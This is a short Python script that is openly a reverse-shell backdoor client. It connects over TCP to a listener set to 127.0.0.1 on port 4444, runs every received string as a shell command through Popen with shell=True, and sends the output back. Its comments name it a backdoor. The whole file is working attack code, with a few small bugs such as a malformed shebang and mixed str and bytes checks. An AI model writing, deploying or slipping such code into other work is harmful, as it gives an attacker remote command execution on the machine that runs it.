#/usr/bin/python env

import socket
from subprocess import PIPE, Popen

IP= '127.0.0.1'
PORT = 4444

noShow = '__NO_INFO__'
# Create our TCP port, with Keep-Alive-Connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while 1:
    # Try to connect forever
    s.connect((IP, PORT))
    while s:
        # While we're connected
        # Recieve some data plz
        data = s.recv(2048).decode()
        # If data isn't equal to nothing
        if not data ==  b'' and not len(data) == 0:
            # Run that data through shell/cmd/terminal/backdoor
            sendData = Popen(data, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            # Convert Objects to text response
            sendData = str(sendData.stdout.read() + sendData.stderr.read())
            # Take the response and send it back, if there is none, then send our "don't show user info"
            if not len(sendData) == 0 and not sendData == b'':
                # send our shell response
                s.sendall(sendData.encode())
            else:
                # we have no shell data, and since the code is waiting for a response, we must supply the demand with our noShow
                s.sendall(noShow.encode())
